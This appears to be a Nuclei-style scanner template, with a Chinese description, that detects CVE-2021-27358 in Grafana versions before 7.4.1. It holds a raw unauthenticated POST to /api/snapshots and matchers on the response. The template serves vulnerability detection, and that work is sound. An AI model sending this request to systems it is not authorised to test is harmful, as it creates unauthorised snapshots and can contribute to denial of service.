id: CVE-2021-27358
info:
  name: Grafana Unauthenticated Snapshot Creation
  author:
  - l0ne1y
  description: |-
    Grafana拒绝服务漏洞

    Grafana是Grafana实验室的一套提供可视化监控界面的开源监控工具。该工具主要用于监控和分析Graphite、InfluxDB和Prometheus等。

    Grafana before 7.4.1 存在安全漏洞，该漏洞允许未经身份验证的远程攻击者通过远程API调用触发拒绝服务。
  severity: high
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://github.com/grafana/grafana/blob/master/CHANGELOG.md
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - '"deleteUrl":'
    - '"deleteKey":'
  - type: word
    part: header
    words:
    - application/json
  matchers-condition: and
  raw:
  - |
    POST /api/snapshots HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json

    {"dashboard": {"editable":false,"hideControls":true,"nav":[{"enable":false,"type":"timepicker"}],"rows": [{}],"style":"dark","tags":[],"templating":{"list":[]},"time":{},"timezone":"browser","title":"Home","version":5},"expires": 3600}
